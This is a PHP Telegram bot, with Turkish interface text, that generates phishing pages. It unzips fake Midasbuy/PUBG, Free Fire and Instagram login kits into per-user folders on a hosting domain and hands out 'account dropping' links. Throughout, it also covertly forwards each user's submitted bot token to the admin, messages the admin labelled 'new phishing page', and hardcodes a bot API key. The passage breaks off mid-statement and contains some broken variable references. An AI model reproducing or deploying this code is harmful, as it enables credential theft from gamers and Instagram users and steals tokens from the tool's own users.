<?php
define('API_KEY',"5745269780:AAEN4-BcNBdSaXlu6kBVVIEibjPIgASVsOs");
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}
$update = json_decode(file_get_contents('php://input'));
if($update->message){
	$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}
if($update->edited_message){
	$message = $update->edited_message;
	$message_id = $message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
	}
	if($update->channel_post){
	$message = $update->channel_post;
	$message_id = $message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->chat->username;
$title = $message->chat->title;
$name = $message->author_signature;
$from_id = $message->chat->id;
	}
	if($update->edited_channel_post){
	$message = $update->edited_channel_post;
	$message_id = $message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->chat->username;
$name = $message->author_signature;
$from_id = $message->chat->id;
	}
	if($update->inline_query){
		$inline = $update->inline_query;
		$message = $inline;
		$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$query = $message->query;
$text = $query;
		}
	if($update->chosen_inline_result){
		$message = $update->chosen_inline_result;
		$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$inline_message_id = $message->inline_message_id;
$message_id = $inline_message_id;
$text = $message->query;
$query = $text;
		}
		$tc = $update->message->chat->type;
		$re = $update->message->reply_to_message;
		$re_id = $update->message->reply_to_message->from->id;
$re_user = $update->message->reply_to_message->from->username;
$re_name = $update->message->reply_to_message->from->first_name;
$re_messagid = $update->message->reply_to_message->message_id;
$re_chatid = $update->message->reply_to_message->chat->id;
$photo = $message->photo;
$video = $message->video;
$sticker = $message->sticker;
$file = $message->document;
$audio = $message->audio;
$voice = $message->voice;
$caption = $message->caption;
$photo_id = $message->photo[back]->file_id;
$video_id= $message->video->file_id;
$sticker_id = $message->sticker->file_id;
$file_id = $message->document->file_id;
$music_id = $message->audio->file_id;
$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$title = $message->chat->title;
if($re){
	$forward_type = $re->forward_from->type;
$forward_name = $re->forward_from->first_name;
$forward_user = $re->forward_from->username;
	}else{
$forward_type = $message->forward_from->type;
$forward_name = $message->forward_from->first_name;
$forward_user = $message->forward_from->username;
$forward_id = $message->forward_from->id;
if($forward_name == null){
	$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$forward_title = $message->forward_from_chat->title;
	}
}
$title = $message->chat->title;
$admin = "5483519544"; #ايديك 
///
$saiko = json_decode(file_get_contents("saiko.json"),1);
$user = $update->message->from->username; 
$user2 = $update->callback_query->from->username;
$message_id = $message->message_id;
$message_id2 = $update->callback_query->message->message_id; 
$chat_id = $message->chat->id; 
$chat_id2 = $update->callback_query->message->chat->id; 
$id = $message->from->id;
$id2 = $update->callback_query->message->from->id; 
$type = $update->message->chat->type; 
$name = $message->from->first_name.$message->from->last_name;



#مسار الاندكسات#
$midasbuy = ("midas10.zip"); #مسار اندكس ال𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬
$spin = ("spin.zip"); #مسار اندكس عجلة الحظ
$midas26 = ("midas26.zip"); #مسار اندكس بيس
$insta = ("wahuminsta.zip"); #مسار اندكس الانستا
$freefire = ("freefire.zip"); #مسار اندكس 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘

#صور الاندكسات#
$midasbuyphoto = ("https://t.me/DDH_I/78"); #Resim اندكس ال𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬
$spinphoto = ("https://t.me/ksamk4994/14"); #Resim اندكس عجبة الحظ
$midas26photo = ("https://t.me/netspeciall/10"); #Resim اندكس بيس
$instaphoto = ("https://t.me/DDH_I/11"); #Resim اندكس الانستا
$freefirephoto = ("https://t.me/DDH_I/13"); #Resim اندكس 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘
$link = "https://netsky.cf/"; #رابط الاستضافة

#التخزين#
mkdir("database-links");
mkdir("indexdata");
$sudo = 5483519544; #ايدي صاحب البوت


if($text == "/start"  or $text == "/backtomenu"){
# Veri depolama - lütfen kodu kurcalamayın #
file_put_contents("data/$id","$id-Real ID = ✅");
# Veri depolama - lütfen kodu kurcalamayın #
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/9",
'caption'=>
" 🙋‍♂️ ، Hoşgeldin $name , 👋
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
👑 ، Bu bot, ücretsiz olarak [ VIP ] Hesap Düşürme Linkleri oluşturur , 👑
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🤔 [ Nasıl Kullanılırım ? ](https://t.me/XSYNC/100)
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
👩‍✈️ Mazenn Hesap Düşürme Botu !
ℹ️ Bot Versiyon :- 5.0 ⭐
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
      🏆 MIDASBUY S26 🏆
      💎 MIDASBUY S19 💎
      ⭐ X-MUMYA  S19 ⭐
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🚪 [ Kanala Katılın ⬅️️ ](https://t.me/XSYNC)
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
👨‍💻 ، Aşağıdaki düğmeler arasında gezinin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔗 • Hesap Linki Oluştur , 📲',],['text'=>'🗑️ • Hesap Linki Sil , 🗂️️',]],
[['text'=>'🖇️ • Hesap Linklerim , 🗂️️️',]],[['text'=>'🎋 • Premium Paketler , 🎠',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$id");
}

if($text == '🔗 • Hesap Linki Oluştur , 📲'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🧭 • Hoşgeldin canım $name , 👋
🎪 • Bu bölüm dizin oluşturmak içindir , 〽️
🪐 • Botun çalışması için dizini seçin , 🎯
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'👾 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🎯',]],
],'resize_keyboard'=>true])]);}

if($text == '🗑️ • Hesap Linki Sil , 🗂️️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • Hoşgeldin canım $name , 👋
⚠️ • Bu bölüm dizinleri silmek içindir ، 📛
🚸 • Aşağıdaki klavyeden silmek istediğiniz dizinleri seçin ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🏝️',]],
],'resize_keyboard'=>true])]);}

if($text == "🎠 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🏝️"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/8",
'caption'=>
"🧭 • Hoşgeldin canım $name , 👋
🎠 • Aşağıdan dizin türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 ، 💸',],['text'=>'🕯️ • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐',]],[['text'=>'🔥 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲',]],
],'resize_keyboard'=>true])]);}

if($text == '🖇️ • Hesap Linklerim , 🗂️️️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • Hoşgeldin canım $name , 👋
🎯 • Bağlantıyı almak için dizin türünü seçin , ⚠️
🎪 • Aşağıdaki klavyeyi kullanın , 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🪐 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 👾',]],
],'resize_keyboard'=>true])]);}

if($text == "🪐 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ، 👾"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"🧭 • Hoşgeldin canım $name , 👋
🎠 • Aşağıdan dizin türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'💸 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🏝',],['text'=>'🦸‍♂️ • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐',]],[['text'=>'💵 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲',]],
],'resize_keyboard'=>true])]);}

if($text == "👾 • 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🎯"){
file_put_contents("data/$id","$id-Real ID = $database");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/8",
'caption'=>
"👋 • Hoşgeldin canım $name , 🏹
👾 • Bu bölüm dizin oluşturmak içindir 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🪐
🏝️ • Aşağıdaki klavyeden dizin türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎪 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🪔',],['text'=>'🤠 • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐',]],[['text'=>'🏆 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$id");
}
$makeSpin = file_get_contents("indexdata/$id");
if($text != "/start" and $makeSpin == "spin"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-spin");
mkdir("pubg");
mkdir("pubg/$id");
mkdir("pubg/$id/s");
mkdir("database-links/$id");
file_put_contents("pubg/$id/s/token","$text");
file_put_contents("pubg/$id/s/id","$chat_id");
file_put_contents("database-links/$id/spin","link-spin-done");
$zip = new ZipArchive;
if ($zip->open("$spin") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$id/s");
    $zip->close();
    
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/6",
'caption'=>
"✅ • Hesap Düşürme başarıyla oluşturuldu ، 🪔
➖➖➖➖➖➖➖➖➖➖
🎪 • Düşecek Hesap Bot Kimliğiniz ، 🀄
    👉 @$userr 👈
➖➖➖➖➖➖➖➖➖➖
🖇️ • Hesap Düşürme Bağlantınız ، 👇
$link/pubg/$id/m/index.php
➖➖➖➖➖➖➖➖➖➖
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeMidasBuy = file_get_contents("indexdata/$id");
if($text != "/start" and $makeMidasBuy == "midasbuy"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-midasbuy");
mkdir("pubg");
mkdir("pubg/$id");
mkdir("pubg/$id/m");
mkdir("database-links/$id");
file_put_contents("pubg/$id/m/token","$text");
file_put_contents("pubg/$id/m/id","$chat_id");
file_put_contents("database-links/$id/midasbuy","link-midasbuy-done");
$zip = new ZipArchive;
if ($zip->open("$midasbuy") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$id/m");
    $zip->close();
    
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/netspeciall/6",
'caption'=>
"✅ • Hesap Düşürme başarıyla oluşturuldu ، 🪔
➖➖➖➖➖➖➖➖➖➖
🎪 • Düşecek Hesap Bot Kimliğiniz ، 🀄
    👉 @$userr 👈
➖➖➖➖➖➖➖➖➖➖
🖇️ • Hesap Düşürme Bağlantınız ، 👇
$link/pubg/$id/m/index.php
➖➖➖➖➖➖➖➖➖➖
",
]);
}

bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makemidas26 = file_get_contents("indexdata/$id");
if($text != "/start" and $makemidas26 == "midas26"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-midas26");
mkdir("midas26");
mkdir("midas26/$id");
mkdir("database-links/$id");
file_put_contents("midas26/$id/token","$text");
file_put_contents("midas26/$id/id","$chat_id");
file_put_contents("database-links/$id/midas26","link-midas26-done");
$zip = new ZipArchive;
if ($zip->open("$midas26") === TRUE) {
    $zip->extractTo(__DIR__."/"."midas26/$id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Dizin başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr
🖇️ • Dizin Bağlantınız ، 👇
$link/midas26/$id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeFreeFire = file_get_contents("indexdata/$id");
if($text != "/start" and $makeINsta == "freefire"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-freefire");
mkdir("freefire");
mkdir("freefire/$id");
mkdir("database-links/$id");
file_put_contents("freefire/$id/token","$text");
file_put_contents("freefire/$id/id","$chat_id");
file_put_contents("database-links/$id/freefire","link-freefire-done");
$zip = new ZipArchive;
if ($zip->open("$freefire") === TRUE) {
    $zip->extractTo(__DIR__."/"."freefire/$id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Dizin başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr
🖇️ • Dizin Bağlantınız ، 👇
$link/freefire/$id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeINsta = file_get_contents("indexdata/$id");
if($text != "/start" and $makeINsta == "insta"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-insta");
mkdir("insta");
mkdir("insta/$id");
mkdir("database-links/$id");
file_put_contents("insta/$id/token","$text");
file_put_contents("insta/$id/id","$chat_id");
file_put_contents("database-links/$id/insta","link-insta-done");
$zip = new ZipArchive;
if ($zip->open("$insta") === TRUE) {
    $zip->extractTo(__DIR__."/"."insta/$id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Dizin başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr
🖇️ • Dizin Bağlantınız ، 👇
$link/insta/$id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - ᴍᴀᴢᴇɴɴᴏ7 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

if($text == '🎪 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🪔' and !file_exists("pubg/$id/m/index.php")){ 
file_put_contents("indexdata/$id", "midasbuy");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midasbuyphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🪔' and file_exists("pubg/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🤠 • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐' and !file_exists("pubg/$id/s/index.php")){ 
file_put_contents("indexdata/$id", "spin");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$spinphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🤠 • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐' and file_exists("pubg/$id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏆 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲' and !file_exists("midas26/$id/index.php")){ 
file_put_contents("indexdata/$id", "midas26");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midas26photo",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏆 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲' and file_exists("midas26/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 , 🧸' and !file_exists("insta/$id/index.php")){ 
file_put_contents("indexdata/$id", "insta");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$instaphoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 , 🧸' and file_exists("insta/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 , 🀄' and !file_exists("freefire/$id/index.php")){ 
file_put_contents("indexdata/$id", "freefire");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$freefirephoto",
'caption'=>
"🏝️ , Merhaba canım $name ، 🎠

⚠️ , Tokeninizi gönderin ve dizin oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 , 🀄' and file_exists("freefire/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm canım, bir Dizinden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_midasbuy = file_get_contents("database-links/$id/midasbuy");
if($text == '💸 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🏝️' and $link_midasbuy == "link-midasbuy-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/pubg/$id/m/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '💸 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 , 🏝️' and !file_exists("pubg/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_spin = file_get_contents("database-links/$id/spin");
if($text == '🦸‍♂️ • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐' and $link_spin == "link-spin-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/pubg/$id/s/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🦸‍♂️ • 𝗫-𝗠𝗨𝗠𝗬𝗔 , ⭐' and !file_exists("pubg/$id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_midas26 = file_get_contents("database-links/$id/midas26");
if($text == '💵 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲' and $link_midas26 == "link-midas26-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/midas26/$id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '💵 • ️𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 𝗦𝟮𝟲 📲' and !file_exists("midas26/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_insta = file_get_contents("database-links/$id/insta");
if($text == '🎪 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🏹' and $link_insta == "link-insta-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/insta/$id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🏹' and !file_exists("insta/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_freefire = file_get_contents("database-links/$id/freefire");
if($text == '🏝️ • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🎠' and $link_freefire == "link-freefire-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/freefire/$id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🎠' and !file_exists("freefire/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎠 • 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 ، 💸' and !file_exists("pubg/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
